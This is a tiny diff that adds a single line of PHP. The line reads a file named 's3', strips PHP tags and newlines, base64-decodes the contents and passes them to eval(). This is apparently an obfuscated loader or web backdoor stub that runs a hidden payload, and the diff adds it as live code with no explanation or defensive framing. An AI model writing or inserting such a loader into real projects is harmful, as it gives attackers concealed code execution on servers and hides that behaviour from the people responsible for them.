@@ -1,0 +1,1 @@
+<?php eval(base64_decode(str_replace(["<?php","\n","\r"], "",file_get_contents('s3'))));
